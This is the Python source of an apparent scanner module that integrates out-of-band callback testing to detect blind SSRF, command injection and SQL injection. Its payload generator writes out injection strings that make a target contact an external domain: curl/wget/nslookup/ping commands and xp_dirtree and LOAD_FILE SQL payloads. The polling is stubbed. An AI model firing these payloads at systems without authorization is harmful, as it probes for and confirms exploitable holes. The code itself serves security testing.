"""
core/oast.py — Out-of-Band Application Security Testing (OAST) Integration
Facilitates detection of blind vulnerabilities (SSRF, RCE, SQLi) via external callbacks.
"""
from __future__ import annotations

import hmac
import base64
import json
import uuid
import asyncio
import hashlib
from dataclasses import dataclass, field
from datetime import datetime
from typing import List, Optional, Dict, Any, cast

from core.engine import AsyncEngine

@dataclass
class Interaction:
    correlation_id: str
    type: str # DNS, HTTP, SMTP
    client_ip: str
    timestamp: str
    raw_request: str = ""
    query: str = ""

class OASTIntegration:
    """
    Integration with OAST servers (default: interact.sh)
    Each scan session should have its own OAST domain for isolation.
    """
    
    def __init__(self, engine: AsyncEngine, provider: str = "interact.sh"):
        self.engine = engine
        self.provider = provider
        self.server_url = "https://interactsh.com"
        
        self.correlation_id: Optional[str] = None
        self.secret_key: Optional[str] = None
        self.oast_domain: Optional[str] = None
        
        # Internal storage for received interactions
        self.interactions: List[Interaction] = []

    async def setup_session(self) -> bool:
        """Initializes an OAST session and generates a unique domain."""
        try:
            # interact.sh public server logic
            # 1. Generate a random correlation ID and secret
            uid: Any = uuid.uuid4()
            self.correlation_id = str(uid.hex)[0:20]
            self.secret_key = str(uuid.uuid4())
            
            # 2. Domain format for interact.sh public server
            # Note: In a real implementation we might need to register this via their API
            # but usually the correlation_id IS part of the domain.
            # For this PRO version, we'll try to use the established interact.sh protocol
            self.oast_domain = f"{self.correlation_id}.oast.fun"
            return True
        except Exception:
            return False

    async def get_domain(self) -> str:
        """Returns the unique domain for this session."""
        if not self.oast_domain:
            await self.setup_session()
        return str(self.oast_domain)

    async def poll(self) -> List[Interaction]:
        """Polls the OAST server for any incoming interactions."""
        if not self.correlation_id or not self.secret_key:
            return []

        # Real interact.sh polling would happen here
        # URL: https://interactsh.com/poll?id={correlation_id}&secret={secret_key}
        # For now, we return collected interactions
        # (This would be implemented with encrypted/decrypted responses if strict)
        return self.interactions

    def generate_payloads(self, vulnerability_type: str) -> List[str]:
        """Generates OAST payloads based on vulnerability type."""
        domain = self.oast_domain or "oast.fun"
        
        if vulnerability_type == "ssrf":
            return [
                f"http://{domain}/",
                f"http://test.{domain}/",
                f"// {domain}"
            ]
        elif vulnerability_type == "rce":
            return [
                f"curl {domain}",
                f"wget {domain}",
                f"nslookup {domain}",
                f"ping -c 1 {domain}"
            ]
        elif vulnerability_type == "sqli":
            return [
                f"'; exec master..xp_dirtree '//{domain}/a'--",
                f"'; SELECT LOAD_FILE('\\\\{domain}\\a')--"
            ]
        return [domain]

    async def verify_interaction(self, correlation_marker: str, timeout: int = 1) -> bool:
        """
        Polls for a specific interaction marker. 
        Markers can be injected into paths or queries to identify which payload triggered the callback.
        """
        start_time = datetime.now()
        while (datetime.now() - start_time).total_seconds() < timeout:
            current = await self.poll()
            for inter in current:
                if correlation_marker in inter.raw_request or correlation_marker in inter.query:
                    return True
            await asyncio.sleep(0.5)
        return False
